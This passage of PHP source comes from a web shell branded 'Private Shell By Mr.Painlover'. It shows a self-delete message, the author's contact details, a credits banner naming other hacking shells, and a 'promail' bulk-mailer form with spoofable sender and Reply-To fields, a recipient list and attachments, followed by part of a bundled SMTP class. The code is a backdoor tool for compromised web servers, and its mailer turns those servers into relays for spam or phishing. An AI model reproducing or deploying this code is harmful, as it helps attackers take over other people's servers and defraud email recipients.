			die('Shell Ke Hapus :D Makasih Telah Menggunakan Shell Ini');
		else
			echo 'unlink error!';
} elseif($_GET['contact'] == 'true') {
	  echo "<center><br><font size='6'>--=[ Contact Me ]=--</font><br><br>
	  <table><td style='background-color: transparent;text-align:center;border: 2px lime dotted;width:300px;height:250px;'>
	  <font color='blue'>Email : bagusbert@gmail.com <br>Telegram : <a href=https://t.me/Painlover_25/>@Painlover_25</a><br>Instagram : <a href=https://www.instagram.com/mr.painlover87/>@mr.painlover87</a></font><br></tr></td></table></center>";
} elseif($_GET['info'] == 'true') {
?><center>
<pre>

██████╗ ██████╗ ██╗██╗   ██╗ █████╗ ████████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔══██╗██║██║   ██║██╔══██╗╚══██╔══╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██████╔╝██║██║   ██║███████║   ██║   █████╗      ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══██║   ██║   ██╔══╝      ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ██║  ██║██║ ╚████╔╝ ██║  ██║   ██║   ███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                 
</pre>
<h3>Thanks To All My Friends</h3>
<hr color="blue" width="400px">
Private Shell By Mr.Painlover
<br>
Source Tools : IndoXploit - Noname SHell - NewShell - AZZASINTS - AGUS SETYA R - Socr7cut - Rinto AR - Mr.Painlover
</center>
<?php
} elseif($_GET['do'] == 'promail') {
error_reporting(0);
function query_str($params){
$str = ''; 
foreach ($params as $key => $value) {
$str .= (strlen($str) < 1) ? '' : '&';
$str .= $key . '=' . rawurlencode($value);
}
return ($str);
}
function lrtrim($string){
return stripslashes(ltrim(rtrim($string)));
}
if(isset($_POST['action'] ) ){

    $b = query_str($_POST);
    parse_str($b);  
    $sslclick=lrtrim($sslclick);  
    $action=lrtrim($action);
    $message=lrtrim($message);
    $emaillist=lrtrim($emaillist);
    $from=lrtrim($from);
    $reconnect=lrtrim($reconnect);
    $epriority=lrtrim($epriority);
    $my_smtp=lrtrim($my_smtp);
    $ssl_port=lrtrim($ssl_port);
    $smtp_username=lrtrim($smtp_username);
    $smtp_password=lrtrim($smtp_password);
    $replyto=lrtrim($replyto);
    $subject_base=lrtrim($subject);
    $realname_base=lrtrim($realname);
    $file_name=$_FILES['file']['name'];
    $file=$_FILES['file']['tmp_name'];
    $urlz=lrtrim($urlz);
    $contenttype=lrtrim($contenttype);
    $encode_text=$_POST['encode'];
    
    
            $message = urlencode($message);
            $message = ereg_replace("%5C%22", "%22", $message);
            $message = urldecode($message);
            $message = stripslashes($message);
            $subject = stripslashes($subject);
        if ($encode_text == "yes") {
            $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
            $subject = str_replace(' ', '_', $subject);
            $subject = "=?UTF-8?Q?$subject?=";
            $realname = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $realname);
            $realname = str_replace(' ', '_', $realname);
            $realname = "=?UTF-8?Q?$realname?=";
        }
}
?>
<form name="form1" method="post" action="" enctype="multipart/form-data">

  <br>

  <table width="100%" border="0" height="407" style="background:#fff" cellpadding="0" cellspacing="0">

    <tr>

      <td width="100%" colspan="4"  style="color:black;background:#01A9DB" height="36">

        <b>

        <font face="Arial" size="2" >&nbsp;SMTP SETUP</font></b></td>

      </tr>
    <tr >

      <td width="10%" height="22" style="padding:10px;">
   
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Login:</font></div>

      </td>

      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="smtp_username" value="<?=$smtp_username;?>" size="30">

        </font></td>

      <td width="31%" height="22" style="padding:10px;">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Pass:</font></div>

      </td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="password" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="smtp_password" value="<?=$smtp_password;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <div align="right">
          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Port :</font></div>

      </td>

      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="ssl_port" value="<?=$ssl_port;?>" size="5"> 
      (optional)</font></td>

      <td width="31%" height="22" style="padding:10px;">

        <div align="right">
          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP Server 
          Smtp:</font></div>

      </td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="my_smtp" value="<?=$my_smtp;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <p align="right">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Server:</font></td>

      <td width="18%" height="22" style="padding:10px;">
      <input type="checkbox" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="sslclick" value="ON" <?if($sslclick){ print "checked"; } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>

      <td width="31%" height="22" style="padding:10px;">

        <p align="right">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 
        After:</font></td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="reconnect" value="<?=$reconnect;?>" size="5"> 
      EMAILS</font></td>

    </tr>
    <tr>

      <td width="100%" height="39"  colspan="4" style="padding:10px;">

        <p align="center">
        <font face="Arial" style="font-size: 9pt" color="#800000"><b>&quot;</b> If 
        you dont have SMTP login, leave blank queries above <b>&quot;</b></font></td>

      </tr>

    <tr>

      <td width="10%" height="19" style="padding:10px;">

        &nbsp;</td>

      <td width="18%" height="19" style="padding:10px;">&nbsp;</td>

      <td width="31%" height="19" style="padding:10px;">

        &nbsp;</td>

      <td width="41%" height="19" style="padding:10px;">&nbsp;</td>

    </tr>

    <tr>

      <td width="100%" colspan="4" style="color:#fff;background:#01A9DB" height="36">

        <b>

        <font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETUP</font></b></td>

      </tr>
	      <tr>

      <td width="10%" height="22" style="padding:10px;">
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File :</font></div>
      </td>

      <td width="59%" height="22" style="padding:10px;"  colSpan="3">
	  <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

      <input type="file" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="file" size="124">

</font></td>

</tr>
<tr>

<td width="10%" height="22" style="padding:10px;">

<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

  Email:</font></div>

</td>

<td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

<input type="text" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="from" value="<?=$from;?>" size="30">

</font></td>

<td width="31%" height="22" style="padding:10px;">

<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

  Name:</font></div>

</td>

<td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

<input type="text" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="realname" value="<?=$realname_base;?>" size="30">

</font></td>

</tr>
<tr>

<td width="10%" height="22" style="padding:10px;">

<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>

</td>

<td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

<input type="text" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="replyto" value="<?=$replyto;?>" size="30">

</font></td>

<td width="31%" height="22" style="padding:10px;">

<p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
Email Priority:</font></td>

<td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

&nbsp;</font><select style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="epriority" id="listMethod" onchange="showHideListConfig()">
<option value="" <?if(strlen($epriority)< 1){print "selected";} ?> >- Please Choose -</option>
<option value="1" <?if($epriority == "1"){print "selected";} ?> >High</option>
<option value="3" <?if($epriority == "3"){print "selected";} ?> >Normal</option>
<option value="5" <?if($epriority == "5"){print "selected";} ?> >Low</option>
</select></td>

</tr>

<tr>

<td width="10%" height="22" style="padding:10px;">

<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>

</td>

<td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

<input type="text" name="subject" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" value="<?=$subject_base;?>" size="90">

</font></td>

</tr>

<tr>

<td width="10%" height="22" style="padding:10px;">

&nbsp;</td>

<td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

&nbsp; <font color="#FF0000">Encode sending information ?</font> <select style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" size="1" name="encode">
<option <?if($encode_text == "yes"){print "selected";} ?>>yes</option>
<option <?if($encode_text == "no"){print "selected";} ?>>no</option>
</select></font></td>

</tr>

<tr valign="top">

<td colspan="3" height="190" style="padding:10px;"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 

        <textarea name="message" cols="60" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" rows="10"><?=$message;?></textarea>

        <br>

        <input type="radio" name="contenttype" value="plain" >

        Plain 

        <input type="radio" name="contenttype" value="html" checked>

        HTML 

        <input type="hidden" name="action" value="send">
		<input class="uibutton" type="submit" value="Send Message">

        </font></td>

      <td width="41%" height="190" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <textarea name="emaillist" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" cols="30" rows="10"><?=$emaillist;?></textarea>

        </font></td>

    </tr>

  </table>

</form>
<?php

if ($action){
        if (!$from && !$subject && !$message && !$emaillist){
        print "<script>alert('Please complete all fields before sending your message.'); </script>";
        die();	}

class SMTP
{
  /**
   *  SMTP server port
   *  @var int
   */
  var $SMTP_PORT = 25;

  /**
   *  SMTP reply line ending
   *  @var string
   */
  var $CRLF = "\r\n";

  /**
   *  Sets whether debugging is turned on
   *  @var bool
   */
  var $do_debug;       # the level of debug to perform

  /**
   *  Sets VERP use on/off (default is off)
   *  @var bool
   */
  var $do_verp = false;

  /**#@+
   * @access private
   */
  var $smtp_conn;      # the socket to the server
  var $error;          # error if any on the last call
  var $helo_rply;      # the reply the server sent to us for HELO
  /**#@-*/

  /**
   * Initialize the class so that the data is in a known state.
   * @access public
   * @return void
   */
  function SMTP() {
    $this->smtp_conn = 0;
    $this->error = null;
    $this->helo_rply = null;

    $this->do_debug = 0;
  }

  /*************************************************************
   *                    CONNECTION FUNCTIONS                  *
   ***********************************************************/

  /**
   * Connect to the server specified on the port specified.
   * If the port is not specified use the default SMTP_PORT.
   * If tval is specified then a connection will try and be
   * established with the server for that number of seconds.
   * If tval is not specified the default is 30 seconds to
   * try on the connection.
   *
   * SMTP CODE SUCCESS: 220
   * SMTP CODE FAILURE: 421
   * @access public
   * @return bool
   */
  function Connect($host,$port=0,$tval=30) {
    # set the error val to null so there is no confusion
    $this->error = null;

    # make sure we are __not__ connected
    if($this->connected()) {
      # ok we are connected! what should we do?
      # for now we will just give an error saying we
      # are already connected
      $this->error = array("error" => "Already connected to a server");
      return false;
    }

    if(empty($port)) {
      $port = $this->SMTP_PORT;
    }

    #connect to the smtp server
    $this->smtp_conn = fsockopen($host,    # the host of the server
                                 $port,    # the port to use
                                 $errno,   # error number if any
                                 $errstr,  # error message if any
                                 $tval);   # give up after ? secs
    # verify we connected properly
    if(empty($this->smtp_conn)) {
      $this->error = array("error" => "Failed to connect to server",
                           "errno" => $errno,
                           "errstr" => $errstr);
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": $errstr ($errno)" . $this->CRLF;
      }
      return false;
    }

    # sometimes the SMTP server takes a little longer to respond
    # so we will give it a longer timeout for the first read
    // Windows still does not have support for this timeout function
    if(substr(PHP_OS, 0, 3) != "WIN")
     socket_set_timeout($this->smtp_conn, $tval, 0);

    # get any announcement stuff
    $announce = $this->get_lines();

    # set the timeout  of any socket functions at 1/10 of a second
    //if(function_exists("socket_set_timeout"))
    //   socket_set_timeout($this->smtp_conn, 0, 100000);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $announce;
    }

    return true;
  }

  /**
   * Performs SMTP authentication.  Must be run after running the
   * Hello() method.  Returns true if successfully authenticated.
   * @access public
   * @return bool
   */
  function Authenticate($username, $password) {
    // Start authentication
    fputs($this->smtp_conn,"AUTH LOGIN" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 334) {
      $this->error =
        array("error" => "AUTH not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    // Send encoded username
    fputs($this->smtp_conn, base64_encode($username) . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 334) {
      $this->error =
        array("error" => "Username not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    // Send encoded password
    fputs($this->smtp_conn, base64_encode($password) . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 235) {
      $this->error =
        array("error" => "Password not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    return true;
  }

  /**
   * Returns true if connected to a server otherwise false
   * @access private
   * @return bool
   */
  function Connected() {
    if(!empty($this->smtp_conn)) {
      $sock_status = socket_get_status($this->smtp_conn);
      if($sock_status["eof"]) {
        # hmm this is an odd situation... the socket is
        # valid but we are not connected anymore
        if($this->do_debug >= 1) {
            echo "SMTP -> NOTICE:" . $this->CRLF .
                 "EOF caught while checking if connected";
        }
        $this->Close();
        return false;
      }
      return true; # everything looks good
    }
    return false;
  }

  /**
   * Closes the socket and cleans up the state of the class.
   * It is not considered good to use this function without
   * first trying to use QUIT.
   * @access public
   * @return void
   */
  function Close() {
    $this->error = null; # so there is no confusion
    $this->helo_rply = null;
    if(!empty($this->smtp_conn)) {
      # close the connection and cleanup
      fclose($this->smtp_conn);
      $this->smtp_conn = 0;
    }
  }

  /***************************************************************
   *                        SMTP COMMANDS                       *
   *************************************************************/

  /**
   * Issues a data command and sends the msg_data to the server
   * finializing the mail transaction. $msg_data is the message
   * that is to be send with the headers. Each header needs to be
   * on a single line followed by a <CRLF> with the message headers
   * and the message body being seperated by and additional <CRLF>.
   *
   * Implements rfc 821: DATA <CRLF>
   *
   * SMTP CODE INTERMEDIATE: 354
   *     [data]
   *     <CRLF>.<CRLF>
   *     SMTP CODE SUCCESS: 250
   *     SMTP CODE FAILURE: 552,554,451,452
   * SMTP CODE FAILURE: 451,554
   * SMTP CODE ERROR  : 500,501,503,421
   * @access public
   * @return bool
   */
  function Data($msg_data) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Data() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"DATA" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 354) {
      $this->error =
        array("error" => "DATA command not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    # the server is ready to accept data!
    # according to rfc 821 we should not send more than 1000
    # including the CRLF
    # characters on a single line so we will break the data up
    # into lines by \r and/or \n then if needed we will break
    # each of those into smaller lines to fit within the limit.
    # in addition we will be looking for lines that start with
    # a period '.' and append and additional period '.' to that
    # line. NOTE: this does not count towards are limit.

    # normalize the line breaks so we know the explode works
    $msg_data = str_replace("\r\n","\n",$msg_data);
    $msg_data = str_replace("\r","\n",$msg_data);
    $lines = explode("\n",$msg_data);

    # we need to find a good way to determine is headers are
    # in the msg_data or if it is a straight msg body
    # currently I am assuming rfc 822 definitions of msg headers
    # and if the first field of the first line (':' sperated)
    # does not contain a space then it _should_ be a header
    # and we can process all lines before a blank "" line as
    # headers.
    $field = substr($lines[0],0,strpos($lines[0],":"));
    $in_headers = false;
    if(!empty($field) && !strstr($field," ")) {
      $in_headers = true;
    }

    $max_line_length = 998; # used below; set here for ease in change

    while(list(,$line) = @each($lines)) {
      $lines_out = null;
      if($line == "" && $in_headers) {
        $in_headers = false;
      }
      # ok we need to break this line up into several
      # smaller lines
      while(strlen($line) > $max_line_length) {
        $pos = strrpos(substr($line,0,$max_line_length)," ");

        # Patch to fix DOS attack
        if(!$pos) {
          $pos = $max_line_length - 1;
        }

        $lines_out[] = substr($line,0,$pos);
        $line = substr($line,$pos + 1);
        # if we are processing headers we need to
        # add a LWSP-char to the front of the new line
        # rfc 822 on long msg headers
        if($in_headers) {
          $line = "\t" . $line;
        }
      }
      $lines_out[] = $line;

      # now send the lines to the server
      while(list(,$line_out) = @each($lines_out)) {
        if(strlen($line_out) > 0)
        {
          if(substr($line_out, 0, 1) == ".") {
            $line_out = "." . $line_out;
          }
        }
        fputs($this->smtp_conn,$line_out . $this->CRLF);
      }
    }

    # ok all the message data has been sent so lets get this
    # over with aleady
    fputs($this->smtp_conn, $this->CRLF . "." . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "DATA not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Expand takes the name and asks the server to list all the
   * people who are members of the _list_. Expand will return
   * back and array of the result or false if an error occurs.
   * Each value in the array returned has the format of:
   *     [ <full-name> <sp> ] <path>
   * The definition of <path> is defined in rfc 821
   *
   * Implements rfc 821: EXPN <SP> <string> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE FAILURE: 550
   * SMTP CODE ERROR  : 500,501,502,504,421
   * @access public
   * @return string array
   */
  function Expand($name) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
            "error" => "Called Expand() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"EXPN " . $name . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "EXPN not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    # parse the reply and place in our array to return to user
    $entries = explode($this->CRLF,$rply);
    while(list(,$l) = @each($entries)) {
      $list[] = substr($l,4);
    }

    return $list;
  }

  /**
   * Sends the HELO command to the smtp server.
   * This makes sure that we and the server are in
   * the same known state.
   *
   * Implements from rfc 821: HELO <SP> <domain> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE ERROR  : 500, 501, 504, 421
   * @access public
   * @return bool
   */
  function Hello($host="") {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
            "error" => "Called Hello() without being connected");
      return false;
    }

    # if a hostname for the HELO was not specified determine
    # a suitable one to send
    if(empty($host)) {
      # we need to determine some sort of appopiate default
      # to send to the server
      $host = "localhost";
    }

    // Send extended hello first (RFC 2821)
    if(!$this->SendHello("EHLO", $host))
    {
      if(!$this->SendHello("HELO", $host))
          return false;
    }

    return true;
  }

  /**
   * Sends a HELO/EHLO command.
   * @access private
   * @return bool
   */
  function SendHello($hello, $host) {
    fputs($this->smtp_conn, $hello . " " . $host . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER: " . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => $hello . " not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    $this->helo_rply = $rply;

    return true;
  }

  /**
   * Gets help information on the keyword specified. If the keyword
   * is not specified then returns generic help, ussually contianing
   * A list of keywords that help is available on. This function
   * returns the results back to the user. It is up to the user to
   * handle the returned data. If an error occurs then false is
   * returned with $this->error set appropiately.
   *
   * Implements rfc 821: HELP [ <SP> <string> ] <CRLF>
   *
   * SMTP CODE SUCCESS: 211,214
   * SMTP CODE ERROR  : 500,501,502,504,421
   * @access public
   * @return string
   */
  function Help($keyword="") {
    $this->error = null; # to avoid confusion

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Help() without being connected");
      return false;
    }

    $extra = "";
    if(!empty($keyword)) {
      $extra = " " . $keyword;
    }

    fputs($this->smtp_conn,"HELP" . $extra . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 211 && $code != 214) {
      $this->error =
        array("error" => "HELP not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    return $rply;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command.
   *
   * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,421
   * @access public
   * @return bool
   */
  function Mail($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Mail() without being connected");
      return false;
    }

    $useVerp = ($this->do_verp ? "XVERP" : "");
    fputs($this->smtp_conn,"MAIL FROM:<" . $from . ">" . $useVerp . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "MAIL not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Sends the command NOOP to the SMTP server.
   *
   * Implements from rfc 821: NOOP <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE ERROR  : 500, 421
   * @access public
   * @return bool
   */
  function Noop() {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Noop() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"NOOP" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "NOOP not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Sends the quit command to the server and then closes the socket
   * if there is no error or the $close_on_error argument is true.
   *
   * Implements from rfc 821: QUIT <CRLF>
   *
   * SMTP CODE SUCCESS: 221
   * SMTP CODE ERROR  : 500
   * @access public
   * @return bool
   */
  function Quit($close_on_error=true) {
    $this->error = null; # so there is no confusion

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Quit() without being connected");
      return false;
    }

    # send the quit command to the server
    fputs($this->smtp_conn,"quit" . $this->CRLF);

    # get any good-bye messages
    $byemsg = $this->get_lines();

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $byemsg;
    }

    $rval = true;
    $e = null;

    $code = substr($byemsg,0,3);
    if($code != 221) {
      # use e as a tmp var cause Close will overwrite $this->error
      $e = array("error" => "SMTP server rejected quit command",
                 "smtp_code" => $code,
                 "smtp_rply" => substr($byemsg,4));
      $rval = false;
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $e["error"] . ": " .
                 $byemsg . $this->CRLF;
      }
    }

    if(empty($e) || $close_on_error) {
      $this->Close();
    }

    return $rval;
  }

  /**
   * Sends the command RCPT to the SMTP server with the TO: argument of $to.
   * Returns true if the recipient was accepted false if it was rejected.
   *
   * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250,251
   * SMTP CODE FAILURE: 550,551,552,553,450,451,452
   * SMTP CODE ERROR  : 500,501,503,421
   * @access public
   * @return bool
   */
  function Recipient($to) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Recipient() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"RCPT TO:<" . $to . ">" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250 && $code != 251) {
      $this->error =
        array("error" => "RCPT not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Sends the RSET command to abort and transaction that is
   * currently in progress. Returns true if successful false
   * otherwise.
   *
   * Implements rfc 821: RSET <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE ERROR  : 500,501,504,421
   * @access public
   * @return bool
   */
  function Reset() {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Reset() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"RSET" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "RSET failed",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    return true;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command. This command
   * will send the message to the users terminal if they are logged
   * in.
   *
   * Implements rfc 821: SEND <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,502,421
   * @access public
   * @return bool
   */
  function Send($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Send() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"SEND FROM:" . $from . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "SEND not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command. This command
   * will send the message to the users terminal if they are logged
   * in and send them an email.
   *
